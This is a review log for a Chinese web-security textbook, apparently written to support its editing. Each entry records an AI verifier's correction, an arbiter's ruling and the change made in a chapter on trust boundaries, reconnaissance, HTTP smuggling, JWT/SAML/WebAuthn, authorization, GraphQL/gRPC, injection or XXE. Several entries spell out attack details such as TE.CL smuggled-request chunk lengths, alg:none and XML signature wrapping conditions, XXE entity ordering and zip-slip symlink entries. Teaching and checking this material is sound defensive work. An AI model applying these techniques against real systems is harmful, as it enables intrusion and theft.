# 跨模型審查與裁決總日誌（Verify Log — 《邊界失守》）


## Round 1（`codex gpt-6.2-sol low` + `ch16` `argon-low` fallback）


<!-- source: verify-log-slice-1.md -->
# Adjudication & Bridging Review Log — Slice 1 (`ch01`–`ch05`)

## [2026-11-21] ch01-trust-boundaries.md — fixed
claim: 資料庫 ACID 成立的前提，是所有狀態變更都必須經過單一資料庫引擎排程，且呼叫端本身沒有被置換。
book value: 所有狀態變更都必須經過單一資料庫引擎排程，且呼叫端本身沒有被置換  verifier value: ACID 保證涵蓋已納入該資料庫交易管理且受已宣告約束涵蓋的資料表狀態，無法自動延伸至未納入同一交易的外部系統副作用與上游解析層  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — ACID guarantees apply to data managed within the transaction boundary even for untrusted callers or distributed protocols; the actual boundary gap is cross-layer states and external side effects outside the DB transaction.
tiebreak: n/a
action: Revised bridge failure boundary and transaction guarantee description to accurately scope ACID guarantees to transaction-managed table states and constraints.

## [2026-11-21] ch01-trust-boundaries.md — fixed
claim: 把任意後端系統抽象為一個確定性或非確定性狀態機 M = (S, s_0, Σ, δ, I)，其中 δ: S × Σ → S。
book value: 確定性或非確定性狀態機 δ: S × Σ → S  verifier value: 將排程選擇與環境事件納入輸入字母表 Σ 後以 δ: S × Σ → S 表示，或對非確定性模型採 δ: S × Σ → 𝒫(S)，且單步符號 σ_i ∈ Σ、序列 w = (σ_1, ..., σ_k) ∈ Σ*  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — A single-valued function δ: S × Σ → S is deterministic; explicitly noted δ: S × Σ → 𝒫(S) for nondeterministic transitions and distinguished single symbol σ_i ∈ Σ from sequence w ∈ Σ*.
tiebreak: n/a
action: Updated state machine signature, alphabet definition, and reachability predicate s_j ∈ S \ I along feasible execution prefixes.

## [2026-11-21] ch01-trust-boundaries.md — fixed
claim: Inv_2 (資金守恆)、5 筆請求在 2,000 req/s 容量下僅佔 0.25% 尖峰頻寬 (到達視窗 < 2 ms)、最小請求數 = 2..5 次、僅需 1 次請求即令餘額憑空增加 5,000 分違背 Inv_2、攻擊者永遠沿著攻擊樹中成本最低的 OR 分支前進。
book value: Inv_2 僅列提款累計上限且混列 2..5 次最小請求數與 < 2 ms 推論  verifier value: Inv_2 納入當前餘額 B_db + ∑ successful_withdrawals == B_0 + ∑ verified_deposits 且單筆 amount > 0；5 筆占一秒尖峰請求量 0.25%；最小超額請求數為 2 次；理性攻擊者在可比影響下優先選擇已知且可達之低成本分支  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Including B_db and amount > 0 in Inv_2 makes the negative-withdrawal violation of Inv_2 mathematically exact; 2 full-balance withdrawals suffice to exceed B_0.
tiebreak: n/a
action: Updated Inv_2/Inv_4 formulas, explicit non-atomic table premises, request count ratios, minimum request count (2), and attack tree heuristic phrasing.

## [2026-11-21] ch01-trust-boundaries.md — fixed
claim: 動手做直連 Redis/Node.js 描述與自我檢核 Q1 情境 B（使帳本總資金非法增加的第二個例子）。
book value: 實驗直連讀寫 Redis Session/限流與情境 B 偷領他戶資金使總資金增加  verifier value: 實驗展示 0.0.0.0 埠暴露與直連 app:3000 避開 Nginx；自我檢核 Q1 情境 B 改為缺少唯一冪等鍵約束的外部入金 Webhook 重複入帳，使帳本總資金在滿足 balance >= 0 與 SERIALIZABLE 下仍非法增加  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Unauthorized withdrawal decreases or transfers balance rather than increasing total ledger balance; duplicate deposit credit without idempotency key directly increases total ledger balance while satisfying balance >= 0.
tiebreak: n/a
action: Refined lab observation scope to match app.mjs and replaced Self-Check Q1 Scenario B with duplicate idempotency-unprotected deposit credit; refined Q2 path containment and symlink checks.

## [2026-11-21] ch02-recon-and-audit-workflow.md — fixed
claim: MITM 代理交握圖序號、會話 A 建立條件、SyntaxError 歸因、.js.map 揭露範圍與 Allow 標頭範圍。
book value: 圖示步驟 2/3 順序顛倒；完全取決於信任 Root CA；幾乎確定是 Express body-parser；拿回整個前端專案與所有端點；直接讀出後端支援的全部方法  verifier value: 修正圖示為先 CONNECT 後 200 再 TLS 交握；在一般憑證鏈驗證場景（無 Pinning/mTLS 且葉憑證合法）下取決於信任代理 Root CA；JSON 解析錯誤指向 JS/Node 解析層；.js.map 揭露該建置區塊涵蓋之原始碼與端點；Allow 標頭反映回應層對該資源宣告的方法  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Diagram step ordering and overly sweeping black-box fingerprinting claims needed precision to match protocol and build-chunk boundaries.
tiebreak: n/a
action: Fixed ASCII diagram step numbers (1–6) and tightened black-box fingerprinting, source map, and Allow header scope statements.

## [2026-11-21] ch02-recon-and-audit-workflow.md — fixed
claim: APS 評分範例因子對應（Input_Complexity 與 Sink_Impact）及 NestJS 請求生命週期 Exception Filters 順序。
book value: 自由字串排序條件填 3、Raw SQL 未區分影響級距即填 4；Exception Filters 列為每筆正常請求最後必經階段  verifier value: 對齊級距定義（動態鍵名與巢狀篩選物件為 3，複合 XML/ZIP 為 4；Sink_Impact 依跨表讀寫/帳本竄改 3 或完整認證繞過/RCE 4 區分 54..72 分）；Exception Filters 標明為任一階段拋出未捕獲例外時的處理分支  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Aligning Input_Complexity and Sink_Impact with section 2.4's rubric and separating Exception Filters from the normal request return path makes the model internally consistent.
tiebreak: n/a
action: Updated APS examples in sections 2.4, 2.5, Lab reference answer, and Self-Check A4; updated NestJS lifecycle diagram in section 2.4.4 and Self-Check A3.

## [2026-11-21] ch02-recon-and-audit-workflow.md — fixed
claim: 動手做基線 JSON 位元組長度（404 94 vs 404 77）與自我檢核 Q2 軟 404 過濾條件。
book value: {"message":"Cannot GET /v1/...","error":"Not Found","statusCode":404} 標為 94 bytes；僅靠 status/type/length 保證零漏報  verifier value: 代入 15-byte 測試路徑 /v1/probe_71f2a 時精確長度為 23 + 15 + 39 = 77 bytes（404 77），且基線與候選探測使用一致認證標頭並涵蓋 GET/POST；軟 404 過濾結合剝除動態 nonce 後的 HTML 殼層結構特徵與 Accept: application/json 及 POST/OPTIONS 方法交叉驗證  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Direct byte count of `{"message":"Cannot GET /v1/probe_71f2a","error":"Not Found","statusCode":404}` is 77 bytes.
tiebreak: n/a
action: Fixed baseline byte count to `404 77` (`77 bytes`), added auth header and GET/POST loop to the probe script, and refined Soft-404 filtering criteria in Self-Check Q2/A2.

## [2026-11-21] ch03-http-smuggling.md — fixed
claim: 解析器邊界分歧的雙向效應、HTTP/1.1 訊息定界本質與殘留位元組緩衝區位置。
book value: 分歧僅描述後端早停留下尾巴、稱 HTTP/1.1 為無外框純文字串流協定、稱殘留位元組必留在核心 TCP socket 緩衝區  verifier value: 明確區分後端早停（殘留位元組成為下一筆請求開頭）與後端晚停（吞併下一筆請求開頭進前一筆主體）及連線繼續複用前提；說明 HTTP/1.1 在 TCP 串流上以內嵌文字起始行與標頭語法界定邊界且主體可含二進位資料；殘留位元組位於連線接收緩衝區（核心或應用程式串流緩衝區）  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — As shown in lab_smuggle.mjs (`buf = buf.subarray(bodyEnd)`), unconsumed bytes often reside in the application's user-space stream buffer as well as kernel socket buffers.
tiebreak: n/a
action: Updated opening derivation, HTTP/1.1 framing description, and stream buffer state transition explanation.

## [2026-11-21] ch03-http-smuggling.md — fixed
claim: TE.CL Worked Example 與自我檢核 Q2 內層走私請求缺少 Host 標頭；RFC 9112 §5.1 冒號前空白處理規則；時間差探測與租戶分池隔離粒度。
book value: TE.CL 內層 POST 請求未含 Host 標頭（Chunk 長度 0x39 / 0x35）；冒號前空白寫嚴格解析器會拒收或忽略；租戶分池寫成可防止污染其他使用者  verifier value: TE.CL 內層請求已封閉標頭，補上 Host 標頭並重算精確區塊長度（Worked Example 為 85 bytes = 0x55，外層總長 96 bytes；自我檢核 Q2 為 70 bytes = 0x46）；RFC 9112 §5.1 要求伺服器對冒號前空白以 400 拒絕；區分每請求獨立上游連線與按租戶分池（後者僅限制跨租戶污染）  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — In TE.CL the smuggled inner POST request closes its own headers with `\r\n\r\n`, so unlike CL.TE it cannot borrow the victim's Host header and must carry its own Host header to pass RFC 9112 §3.2 validation.
tiebreak: n/a
action: Added `Host` header to TE.CL worked example (recomputed chunk length `55\r\n` = 85 bytes) and Self-Check Q2/A2 (recomputed chunk length `46\r\n` = 70 bytes); clarified RFC 9112 §5.1 rejection vs vulnerable ignore behavior, buffering proxy assumption in timing probes, and per-request vs per-tenant connection isolation.

## [2026-11-21] ch04-authentication-and-sessions.md — fixed
claim: JWT Header 查表與信任根邊界、alg: none 觸發條件、PKCS#1 vs X.509 SPKI 公鑰格式名稱、HMAC 長金鑰雜湊行為與 PKCE plain 降級條件。
book value: 先讀 Header 決定哪把金鑰即任意身分偽造；PUBLIC KEY 標為 PKCS#8 SPKI；差一個位元組 HMAC 永遠不同；plain 降級僅攔截 code 即可兌換  verifier value: 驗簽前可解析 kid 作為伺服器預先限定之可信金鑰集內的查表提示，允許未驗證 Header 改變演算法政策、金鑰類型或可信金鑰來源才構成信任根倒置；BEGIN PUBLIC KEY 修正為 X.509 SPKI；說明 >64B PEM 先經 SHA-256 壓縮為 K'；區分未啟用 PKCE（攔截 code 即可兌換）與降級為 plain（觀測或指定授權請求參數即得知 verifier）  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — `BEGIN PUBLIC KEY` is X.509 SubjectPublicKeyInfo (SPKI), whereas PKCS#8 is a private-key format; constrained `kid` lookup in a trusted JWKS is standard practice.
tiebreak: n/a
action: Updated bridge failure boundary, `alg: none` condition, X.509 SPKI terminology (in prose and Lab tip), HMAC key derivation explanation, and PKCE plain downgrade requirements.

## [2026-11-21] ch04-authentication-and-sessions.md — fixed
claim: Refresh Token 輪換 UPDATE 回傳 0 列時的重用判定、自我檢核 Q2 撤權後最長存取視窗（300 s vs 899 s）與 Q3 OAuth redirect_uri 參數外洩條件。
book value: UPDATE 回傳 0 列立即判定為 Token Reuse；撤銷金鑰後仍可存取 900 s；重導向至 next 直接外洩另一查詢參數 code  verifier value: UPDATE 回傳 0 列時須先檢查持久化記錄是否為已存在且 used = true（排除自然過期或無效雜湊）才觸發整個 family_id 撤銷；區分立即自權威 JWKS 移除舊公鑰（上限 min(899 s, 300 s) = 300 s）與保留舊公鑰／僅停用帳號（上限 899 s ≈ 15 分鐘）；明定開放重導向端點保留查詢字串或經寬鬆 Referrer-Policy 外洩 Referer  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Zero updated rows on a multi-predicate WHERE clause can be caused by expiry or unknown hash; checking `used = true` on the existing row within a transaction accurately isolates token reuse.
tiebreak: n/a
action: Updated Refresh Token rotation transaction logic, middleware lifetime claim checks, and Self-Check Q2/A2 and Q3/A3 derivations.

## [2026-11-21] ch05-enterprise-sso-and-mfa.md — fixed
claim: Exclusive C14N 空白文字節點行為、286 bytes 正規化輸入與 32 bytes SHA-256 摘要區分、XSW #1/#3 圖表一致性、惡意 Assertion 子節點位置及標準 XML DOM 限定名稱查詢（getElementsByTagNameNS / saml:NameID）。
book value: 稱 C14N 消除空白、寫 SHA-256 Digest 位元組長度 = 285 bytes、稱惡意 Assertion 為 <samlp:Response> 第一個子節點、使用 getElementsByTagName("NameID")[0] 查詢 <saml:NameID>、Comment("") 無空白  verifier value: Exclusive C14N 保留節點集內文字空白（範例將已簽章 Assertion 寫為緊湊單行，正規化輸入精確為 286 bytes，SHA-256 摘要輸出為 32 bytes）；統一 XSW #1 圖表為包裹已簽章 Response；明定惡意 Assertion 為 <saml:Issuer> 之後的第一個 <saml:Assertion>（第 2 個元素子節點）；改用 getElementsByTagNameNS(SAML_NS, "NameID")[0] 或 getElementsByTagName("saml:NameID")[0]；<!-- --> 對應 Comment(" ")  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — In standard XML DOM, `getElementsByTagName` matches qualified name `saml:NameID`, and Exclusive C14N preserves inter-element whitespace text nodes while producing a 32-byte SHA-256 digest from the 286-byte compact canonicalized `<saml:Assertion>`.
tiebreak: n/a
action: Updated XMLDSig diagram, XSW #1/#3 topology diagram, Section 5.3 Worked Example XML and byte-count derivation (286-byte C14N input -> 32-byte SHA-256 digest), DOM namespace queries, and `Comment(" ")` node representation.

## [2026-11-21] ch05-enterprise-sso-and-mfa.md — fixed
claim: SP-initiated InResponseTo 會話綁定、Assertion/@ID 防重放 TTL 涵蓋 Clock Skew、WebAuthn 七項驗證邊界（含 signCount 風險政策與公鑰驗簽）及 MFA 嘗試次數原子遞增時機。
book value: 僅單次作廢 InResponseTo 即防登入 CSRF；防重放 TTL 僅計 NotOnOrAfter 剩餘秒數；WebAuthn 寫五項邊界且要求 signCount 嚴格遞增；核發或驗證 MFA 時皆執行 INCR  verifier value: InResponseTo 須綁定發起登入的瀏覽器會話並原子消費；防重放 TTL 須覆蓋 NotOnOrAfter 剩餘秒數加容許時鐘偏差 clockSkewSeconds；WebAuthn 明列七項驗證邊界（含憑證歸屬與公鑰驗簽，signCount 異常依 RP 風險政策處置）；MFA 挑戰於核發時初始化為 0，僅在每次驗證請求前原子 INCR 檢查額度（> 5 即刪除挑戰）並於核准時原子銷毀挑戰  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — Incrementing attempts at challenge issuance would waste an attempt, and replay TTL must include clock skew so an assertion cannot be replayed during the skew acceptance window after nominal `NotOnOrAfter`.
tiebreak: n/a
action: Updated Section 5.5 replay/CSRF requirements, Section 5.6 WebAuthn 7-item checklist, Section 5.7 TOTP hit-rate formula, and Section 3 Defense code and MFA attempt counter protocol.

---

## Bridging Review Summary (Slice 1: `ch01`–`ch05`)

| Chapter | Declared Bridge (`outline.md`) | Detected Bridge | Isomorphism Score | Conversational / Everyday Analogies | Verdict |
|---|---|---|---|---|---|
| `ch01-trust-boundaries.md` | 資料庫 ACID 不變量 → 安全不變量（Invariant） | 資料庫 ACID 不變量 → 安全不變量（Security Invariant），明確標出成立邊界與失效邊界 | 5 | None | `pass` |
| `ch02-recon-and-audit-workflow.md` | 系統效能 Profiling（Flamegraph 找熱點）→ 攻擊面測繪與 Source-to-Sink 追蹤 | 系統效能 Profiling（Flamegraph 找熱點）→ 攻擊面測繪與 Source-to-Sink 追蹤，明確標出成立邊界與失效邊界 | 5 | None | `pass` |
| `ch03-http-smuggling.md` | 分散式前後端序列化 Schema 漂移 → HTTP 解析器分歧（Parser Differential） | 分散式前後端序列化 Schema 漂移 → HTTP 解析器分歧（Parser Differential），明確標出成立邊界與失效邊界 | 5 | None | `pass` |
| `ch04-authentication-and-sessions.md` | 分散式快取一致性與過期視窗 → Token / JWKS 驗證與撤銷失效 | 分散式快取一致性與過期視窗 → Token / JWKS 驗證與撤銷失效，明確標出成立邊界與失效邊界 | 5 | None | `pass` |
| `ch05-enterprise-sso-and-mfa.md` | `none`（承接 Ch04 驗證信任鏈直接剖析 SAML/WebAuthn 協定） | `none`（直接承接 Ch04 認證信任鏈切入 XMLDSig 與 WebAuthn） | 5 | None | `pass` |


<!-- source: verify-log-slice-2.md -->
# P4 Adjudication & Bridging Review Log — Slice 2 (Ch06–Ch10)

## [2026-11-21] ch06-authorization-and-multitenancy.md — fixed
claim: 當系統實作漏掉其中一維的檢查，就會對應出三種截然不同的漏洞型態（四元決策輸入與三種漏洞分類關係）
book value: 四元組漏掉其中一維即一對一對應 BOLA/BOPLA/BFLA  verifier value: 依失效的授權粒度與檢核範圍區分為物件、物件屬性與功能三類（Context 可伴隨於任一類，且單一端點可同時漏檢多項）  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 四元組含 Subject/Action/Object/Context，其中 BOLA 與 BOPLA 皆涉及 Object（整列 vs 屬性），並非四對三的一對一映射。
tiebreak: n/a
action: 修正第 1 節導言與 BOPLA 2019→2023 合併說明，並於 Policy Engine 輸入補齊 `{ subject, action, resource, context }`。

## [2026-11-21] ch06-authorization-and-multitenancy.md — fixed
claim: E1 GET 端點 BOLA 示範直接推論「讀取或提領對方的 10,000 分（$100.00）餘額」與 Worked Example 六位數損失敘述
book value: 由 E1 GET 查表直接推得提領，且將情境估算手續費漏損 $225,000.00 直接混稱為帳本損失  verifier value: E1 僅示範跨租戶讀取，跨租戶提領須以 E3 存在相同租戶條件漏檢為前提；$225,000.00 為 90,000 筆零費率結算之手續費漏損情境估算，$50,000.00 為 500 戶直接盜領估算，E2 與 E5 費率歸零不重複計入  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 區分 E1 讀取與 E3 提領的授權缺漏前提，並明確標示 $225,000.00 手續費漏損與 $50,000.00 直接盜領為各自的情境估算。
tiebreak: n/a
action: 修正 E1 程式碼解析、Worked Example 角色定義（明定 R1 範圍與矩陣外 platform_admin）與損失估算陳述。

## [2026-11-21] ch06-authorization-and-multitenancy.md — fixed
claim: RLS 適用角色條件、PgBouncer 連線池殘留、Redis 快取命中、DTO 白名單裝飾器與 NULLIF(current_setting(...), '')::bigint 行為
book value: 簡稱為非超級使用者即受 RLS 管轄；未區分 current_setting 未設定（NULL）與空字串（''）；腳本聲稱掃描 6 個端點但實際僅探測 E1/E2/E5  verifier value: RLS 受 BYPASSRLS 與未設 FORCE 時的 Table Owner 影響；NULLIF 將空字串統一轉為 NULL 使相等比較為 UNKNOWN（Fail-Closed）；明示腳本以 TOKEN_B_OPER 探測 E1/E2/E5 三個代表性端點  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 補齊 BYPASSRLS/Table Owner 條件、DTO 屬性驗證裝飾器、E1 查無列轉 404 NotFoundException 及 NULLIF 轉 NULL 的精確 SQL 語意。
tiebreak: n/a
action: 修正橋接失效邊界、故障模式 1、動手做任務一／二描述與參考解答。

## [2026-11-21] ch06-authorization-and-multitenancy.md — fixed
claim: 自我檢核第 3 題：「這組防護能擋下哪一類漏洞，又漏掉了哪兩類？」
book value: 漏掉兩類（把 BOPLA 與 BFLA 併為同一項）  verifier value: 比對 params.tid === user.tenantId 僅擋下路徑租戶與憑證租戶不符的請求，仍漏掉 BOLA、BOPLA 與 BFLA 共三類  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — BOLA、BOPLA、BFLA 為本章定義之三類獨立授權漏洞，應明確列為三類。
tiebreak: n/a
action: 將自我檢核第 3 題題幹與參考解答修正為漏掉 BOLA、BOPLA 與 BFLA 三類。

## [2026-11-21] ch06-authorization-and-multitenancy.md — bridging-review
declared_bridge: PostgreSQL Row-Level Security（RLS）→ 物件層級授權（BOLA）邊界
detected_bridges: ["PostgreSQL Row-Level Security（RLS）→ 物件層級授權（BOLA）邊界"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch07-graphql-grpc-websocket.md — fixed
claim: GraphQL 端點形式、AST 執行樹走訪與欄位建議（Field Suggestion）還原範圍
book value: 斷言 GraphQL 一律收斂於單一 POST /graphql、每個 AST 節點皆呼叫 resolve() 查庫、關閉 Introspection 仍能還原整份隱藏 Schema  verifier value: 限定為常見部署與 NexusPay 實作；區分 AST 欄位選取、父物件列表基數展開之 Resolver 呼叫與實際後端查詢次數；Field Suggestion 可枚舉出大量候選欄位與敏感 Mutation 名稱  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 修正協定通則與實作部署的界線，並精確區分 AST 節點與執行期 Resolver 呼叫數。
tiebreak: n/a
action: 修正導言、橋接段落與 GraphQL 機制第 1–2 點（同時釐清 Document 與 Operation 階層關係）。

## [2026-11-21] ch07-graphql-grpc-websocket.md — fixed
claim: GraphQL Worked Example 與動手做任務一查詢深度／分支度模型及 40.96 s 資料庫耗時推導
book value: 將「單次請求 Batch / Alias 數量：20」混寫；任務一範例查詢僅 3 層帶 limit: 4；直接將累計查詢工時 40.96 s 等同於單一連線牆鐘延遲  verifier value: HTTP Batch 操作數為 1（<= 20）、單一 Operation 內含 20 個 Alias；5 層一對多關聯列表皆設 limit: 4（含純量葉欄位共 6 層 <= 8）；區分第 5 層葉關聯 20,480 次（40.96 s）與全樹累計 27,280 次邊走訪（54.56 s）及循序執行逾時條件  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 對齊 Worked Example 與任務一程式碼的 5 層 limit: 4 展開結構，並明確交代 AST 成本計算式（單一 Alias 1,364、總計 27,280 > 500）。
tiebreak: n/a
action: 修正 Worked Example 條件設定與推論、任務一查詢結構、複雜度計算與 PIN 內部計數器前提。

## [2026-11-21] ch07-graphql-grpc-websocket.md — fixed
claim: Protobuf proto3 純量預設零值、未知欄位透傳與跨語言整數精度／符號邊界
book value: 宣稱 proto3 任何未傳送純量欄位一律解碼為零值且無法區分；把 Node.js 53-bit 精度流失與負數符號問題混寫  verifier value: 限定於預設隱式存在（implicit presence，未標註 optional）的純量欄位；未知欄位透傳取決於保留未知欄位並直接重新序列化原訊息的代理路徑；分別說明 int32/uint32/int64 窄化符號重解讀與 JS Number 53-bit IEEE 754 精度捨入分歧  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 區分 implicit vs explicit presence（optional），並將整數窄化符號問題與 53-bit 浮點精度捨入分開表述。
tiebreak: n/a
action: 修正 gRPC 與 Protobuf 機制第 1–3 點。

## [2026-11-21] ch07-graphql-grpc-websocket.md — fixed
claim: WebSocket CSWSH 測試腳本判定、Cookie SameSite 前提與 Origin 白名單驗證表達式
book value: 非瀏覽器腳本手動帶 Cookie 連線成功即印出 CSWSH vulnerable，且將握手與訂閱包在同一 try/except；Origin 驗證僅寫 new URL(origin).origin === ALLOWED_ORIGIN  verifier value: 腳本驗證的是伺服器未檢查 Origin 與跨租戶訂閱，真實瀏覽器 CSWSH 另須 Cookie 符合跨站／同站附送條件；分開捕捉握手與訊息階段例外；Origin 須先確認為合法單一來源值並與白名單精確全等比對  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 拆分任務二腳本的握手與訂閱例外處理，修正輸出語意、Origin 驗證條件及自我檢核第 3 題解答。
tiebreak: n/a
action: 修正 WebSocket 防禦段落、任務二腳本與自我檢核第 3 題解答。

## [2026-11-21] ch07-graphql-grpc-websocket.md — bridging-review
declared_bridge: RPC/GraphQL Resolver 執行樹 → 非 REST 查詢複雜度與授權破口
detected_bridges: ["RPC/GraphQL Resolver 執行樹 → 非 REST 查詢複雜度與授權破口"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch08-injection-families.md — fixed
claim: PostgreSQL Extended Query Protocol 的 Parse/Bind 階段職責與佔位符 $1 型別限制
book value: 稱 Parse 階段即確定執行計畫，且佔位符 $1 只能綁定數值常數  verifier value: Parse 階段確定語法樹（AST）結構與參數位置，Bind 階段綁定參數值並進行規劃（或套用通用計畫）；佔位符可綁定字串、數值等各型別純量資料值，但不能代替欄位識別字或 ASC/DESC 語法關鍵字  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — PostgreSQL Extended Query Protocol 於 Parse 解析語法樹，於 Bind 帶入純量值（含字串與數值）並規劃執行計畫；ORDER BY $1 會被當作常數運算式而非欄位識別字。
tiebreak: n/a
action: 修正第 1 節正文與自我檢核第 1 題題幹及參考解答，並同步精化橋接目標機制之資料平面定義。

## [2026-11-21] ch08-injection-families.md — fixed
claim: 線性搜尋期望次數（272 vs 270、最壞 512 vs 480）與 P99 延遲上界估算
book value: 混用逐項確認平均 8.5 次（32 × 8.5 = 272）與末項排除最壞 15 次（32 × 15 = 480），並將 P99 45 ms 稱為期望延遲  verifier value: 明確區分逐項確認模型（平均 8.5 次 → 272 次、最壞 512 次；Base64URL 16 字元平均 520 次）與末項排除模型（平均 8.4375 次 → 270 次、最壞 480 次；Base64URL 平均 519.75 次）；將 45 ms 與 545 ms 正確標示為兩分支之 P99 延遲上界  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 同時列出逐項確認與末項排除兩種線性基準模型並將 P99 與平均值語意區分清楚，使數學推導完全自洽。
tiebreak: n/a
action: 修正第 1 節盲注推導、Worked Example 與自我檢核第 4 題解答。

## [2026-11-21] ch08-injection-families.md — fixed
claim: 靜態白名單映射 SORT_COLUMN_MAP / SORT_DIR_MAP 的原型鏈繼承屬性漏洞與盲注驗證腳本 HTTP 狀態檢查
book value: 直接以一般物件索引 `SORT_COLUMN_MAP[String(req.query.sort)] ?? 'created_at'` 並宣稱 100% 與外部輸入切斷；Python 腳本僅檢查 `r.status_code >= 500`  verifier value: 一般物件索引會命中 `toString` 等 `Object.prototype` 繼承屬性（非 null/undefined 故不會觸發 `??`），須先以 `Object.hasOwn()` 檢核自有屬性；Python 腳本應檢查 `r.status_code != 200` 以正確識別修補後的 `400 Bad Request` 攔截  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 一般物件直接取屬性會命中原型鏈上的函式屬性，必須對欄位與方向映射皆使用 `Object.hasOwn`。
tiebreak: n/a
action: 修正故障模式 1 程式碼範例、動手做 Python 腳本狀態碼檢查與驗證說明，並精化 Redis 鍵名碰撞／萬用字元、Argument Injection 與 SSTI 的適用前提。

## [2026-11-21] ch08-injection-families.md — bridging-review
declared_bridge: AST 編譯階段與字串模板拼接 → 資料平面與控制平面混同（Injection）
detected_bridges: ["AST 編譯階段與字串模板拼接 → 資料平面與控制平面混同（Injection）"]
isomorphism_score: 5
conversational_phrases: []
verdict: pass

---

## [2026-11-21] ch09-file-parsers-and-xxe.md — fixed
claim: POSIX 路徑解析與 Linux VFS 函式區分、symlink vs hardlink 機制差異、以及 Node.js/Python/libc 對內嵌 NUL (\x00) 的處理
book value: 將 Linux 核心 `path_lookupat()` 直接當成 POSIX 規範定義；稱硬連結與 symlink 一樣會在開檔時跟隨目標路徑跳出沙箱；稱新版 libc 介面已拒絕路徑中的 `\x00`  verifier value: 區分 POSIX 路徑語意與 Linux VFS 實作；symlink 指向目標路徑字串而 hardlink 直接指向同檔案系統的同一 inode；Node.js/Python 3 檢查字串長度並拒絕內嵌 `\x00`，但以 C 字串傳遞路徑的傳統 libc 介面僅以 `\x00` 為終止符而無長度檢查  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 三處底層作業系統與執行時期語意均須精確區分。
tiebreak: n/a
action: 修正 9.1 節導言與第 4 小節（硬連結、軟連結與 Null Byte 截斷）。

## [2026-11-21] ch09-file-parsers-and-xxe.md — fixed
claim: Worked Example 情境 A 中 `{"secret":"pwned","endpoint":"http://10.0.0.5/hook"}` 的位元組長度與 ZIP 結構偏移
book value: 寫入內容長度算為 51 bytes（0x33），後續偏移依 51 推算（Central Directory 偏移 116 = 0x74、EOCD 偏移 197 = 0xc5、總長 219 bytes）  verifier value: `{"secret":` (10) + `"pwned",` (8) + `"endpoint":` (11) + `"http://10.0.0.5/hook"}` (23) = 52 bytes（0x34）；Central Directory 偏移應為 65 + 52 = 117（0x75），Central Directory 檔名偏移 163（0xa3），EOCD 偏移 198（0xc6），總檔長 220 bytes  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 最後一段 `"http://10.0.0.5/hook"}` 共 23 bytes，總長確為 52 bytes（0x34）。
tiebreak: n/a
action: 將情境 A 與情境 B 中的酬載長度修正為 52 bytes（`0x34`），並同步更新 ZIP Local Header、Central Directory 與 EOCD 的所有精確十六進位／十進位偏移與總檔長（220 bytes）。

## [2026-11-21] ch09-file-parsers-and-xxe.md — fixed
claim: XML 1.0 §2.8 內部 DTD 子集參數實體限制與 §4.2 Error-Based XXE 實體重複宣告綁定規則
book value: 將 `SYSTEM "..."` 稱為 `EntityValue` 並引用 §2.8 Entity Value 限制；稱 Error-Based XXE 利用後宣告覆寫本地 DTD 的既有實體  verifier value: `SYSTEM` 後方為 `SystemLiteral`（不直接展開 `%file;`），而動態構造宣告受限於 XML 1.0 §2.8「WFC: PEs in Internal Subset（內部子集不得在標記宣告內部引用參數實體）」；XML 1.0 §4.2 規定同名實體重複宣告時以最先出現者為準（First Declaration Wins），故須在引入本地 DTD 前預先宣告參數實體以搶佔定義  flagging families: openai (codex:gpt-6.2-sol:low)
arbiter: agrees=true conf=high — 修正 XML 1.0 §2.8（WFC: PEs in Internal Subset + SystemLiteral）與 §4.2（First Declaration Wins）的規範推導。
tiebreak: n/a
action: 修正 9.3 節第 2–3 小節與自我檢核第 2 題參考解答。

## [2026-11-21] ch09-file-parsers-and-xxe.md — fixed
claim: SVG Stored XSS 觸發上下文、`resolveSafePath()` 的祖先目錄與目標 symlink 檢查、以及自我檢核第 3 題 `link/pwn` 描述
book value: 稱提供 SVG 下載或檢視即直接在瀏覽器執行腳本；`resolveSafePath()` 僅在直接父目錄已存在時檢查 `realpathSync(parentDir)` 且未檢查既有目標檔案是否為 symlink；稱 `link/pwn` 不含 `..` 或 `/`  verifier value: SVG 須在允許執行腳本的文件上下文（如頂層導航或 iframe/object/embed，而非 `<img>` 或 attachment 下載）才會執行腳本；`resolveSafePath()` 應向上追溯至最深既有祖先目錄並拒絕覆寫既有 symlink，且說明歸檔解壓須拒絕連結條目與防範 TOCTOU；`link/pwn` 為不含 `..` 且不以 `/` 開頭  flagging families: openai (codex:gpt-6.2-sol:low)
